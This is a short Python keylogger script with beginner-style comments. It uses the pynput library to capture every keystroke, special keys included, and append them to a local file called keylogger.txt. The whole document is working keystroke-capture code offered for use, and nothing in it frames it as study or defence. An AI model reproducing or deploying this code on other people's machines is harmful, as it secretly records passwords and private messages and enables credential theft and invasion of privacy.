#first we are gonna import a module 
from pynput import keyboard

def pressedKey(key):
    #the onpress in our listener object will automatically pass the key thats why we gave the argument here as 'key' 
    #print(str(key)) #printing what key is getting pressed right now

    #easy of of saving something in a file in py
    with open("keylogger.txt",'a') as logkey:
        #creating a file named keylogger.txt if its not already there 
        #a means append stuff to the file 

        try:# as the program sometime craches when things like "spaces" are hit 
            if key == keyboard.Key.space:
                logkey.write('space\n')

            elif key == keyboard.Key.esc:
                logkey.write('esc\n')

            elif key == keyboard.Key.backspace:
                logkey.write('backspace\n')

            elif key == keyboard.Key.alt_l:
                logkey.write('alt left\n')

            elif key == keyboard.Key.alt_r:
                logkey.write('alt right\n')

            elif key == keyboard.Key.tab:
                logkey.write('Tab\n')

            else: 
                char = key.char #converting the key into character 
                logkey.write(char+'\n')

        except:
            print("error getting the char")
    
if __name__ == "__main__":
    #now we are creating an object named listener
    #everytime a key is pressed it will send the information to the function pressedkey
    listener = keyboard.Listener(on_press=pressedKey) 
    listener.start()
    input()